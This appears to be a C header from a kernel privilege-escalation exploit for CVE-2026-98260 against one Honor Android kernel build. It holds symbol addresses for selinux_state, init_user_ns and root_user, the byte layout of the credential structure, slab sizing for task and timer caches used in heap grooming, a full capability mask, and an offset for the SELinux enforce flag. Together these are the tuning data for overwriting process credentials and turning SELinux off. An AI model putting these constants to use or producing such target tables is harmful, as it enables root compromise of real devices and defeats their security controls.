/* pc98260_target_61258c.h — CVE-2026-98260 per-build constants.
 *
 * Target: Honor 6.12.58 g42fcf008ff5c (provided boot image, 2026-11-02)
 *   kernel_release = 6.12.58-android16-6-g42fcf008ff5c-abogki504518581-4k
 *   4K pages, VA_BITS=39
 *
 * Derived from vmlinux_to_elf output of the provided boot.img:
 *   - .symtab: selinux/init_user_ns/root_user/init_groups/init_ucounts
 *   - disassembly: do_timer_create+0xac, prepare_creds+0x2c,
 *     copy_process+0x190, begin_new_exec cleanup offsets
 *   - .BTF: task cred 0x900, real_cred 0x8f8, comm 0x910,
 *     k_itimer 0x100 / it 0x78, cred 0xb8
 */
#ifndef PC98260_TARGET_61258C_H
#define PC98260_TARGET_61258C_H

#include <stdint.h>

#define TARGET_NAME          "honor-61258c"
#define TARGET_KERNEL        "6.12.58-android16-6-g42fcf008ff5c-abogki504518581-4k"
#define TARGET_KERNEL_SHA256 ""

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc0827e6a08)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc082572128)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc0825723a0)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc082573868)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc082573d38)  /* init_ucounts */

/* ---- kprobe/tracepoint call sites ----------------------------------- */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc08051a1e8)  /* do_timer_create+0xac */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc08018c904)  /* prepare_creds+0x2c  */
#define LINK_ALLOC_TASK      UINT64_C(0xffffffc0801bf9c8)  /* copy_process+0x190  */

/* ---- struct geometry (6.12.58 .BTF, byte offsets) ---- */
#define GEO_TASK_CRED        0x900
#define GEO_TASK_REAL_CRED   0x8f8
#define GEO_TASK_COMM        0x910
#define GEO_KITIMER_IT       0x78
#define GEO_KITIMER_SIZE     0x100
#define GEO_KITIMER_STRIDE   0x100
#define GEO_CRED_SIZE        184
#define GEO_CRED_ALLOC_SIZE  192
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry (same 6.12 KMI; live slabinfo is re-checked) ----- */
#define GEO_TASK_OBJSIZE            5696
#define GEO_TASK_OBJ_PER_SLAB       5
#define GEO_TASK_SLAB_PAGES         8
#define GEO_POSIX_TIMER_OBJSIZE     256
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 32
#define GEO_POSIX_TIMER_SLAB_ORDER  1
#define GEO_PAGE_SIZE               4096
#define GEO_FRAG_PAGE_SIZE          8192

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000)
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc081937218)

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL             UINT64_C(0x1ffffffffff)

/* ---- begin_new_exec cleanup offsets (vulnerability check) ----------- */
#define BNE_LINK              UINT64_C(0xffffffc0806c7ea0)
#define BNE_RELEASE_TASK_OFF  0x410
#define BNE_DOWN_READ_OFF     0x4fc
#define BNE_TIMERS_EXIT_OFF   0x84c
#define BNE_EXIT_ITIMERS_OFF   0x85c

#endif /* PC98260_TARGET_61258C_H */
